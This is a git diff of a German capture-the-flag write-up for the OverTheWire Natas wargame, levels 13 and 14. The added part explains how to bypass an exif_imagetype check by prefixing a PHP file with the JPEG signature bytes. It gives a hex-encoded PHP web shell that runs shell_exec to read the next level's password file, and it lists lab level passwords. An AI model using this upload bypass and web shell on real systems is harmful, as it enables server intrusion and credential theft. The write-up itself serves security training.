@@ -218,10 +218,20 @@ echo(shell_exec('cat /etc/natas_webpass/natas13'));
 ?>
 ```
 
-
-
 # Natas 13
 
 Zugriff:	[http://natas13.natas.labs.overthewire.org](http://natas13.natas.labs.overthewire.org)
 Username: `natas13`
 Passwort: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY `
+
+Die Funktion `exif_imagetype` überprüft die ersten Hex-stellen einer Datei, um zu verifizieren, dass die Datei ein Bild ist. Man kann die File Signature eines jpg's `FF D8 FF` vor eine php Datei mit einem Hex Editor einfügen, um den Check zu umgehen. 
+
+```
+FF D8 FF 3C 3F 0D 0A 65 63 68 6F 28 73 68 65 6C 6C 5F 65 78 65 63 28 27 63 61 74 20 2F 65 74 63 2F 6E 61 74 61 73 5F 77 65 62 70 61 73 73 2F 6E 61 74 61 73 31 34 27 29 29 3B 0D 0A
+```
+
+# Natas 14
+
+Zugriff:	[http://natas14.natas.labs.overthewire.org](http://natas14.natas.labs.overthewire.org)
+Username: `natas14`
+Passwort: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1  `
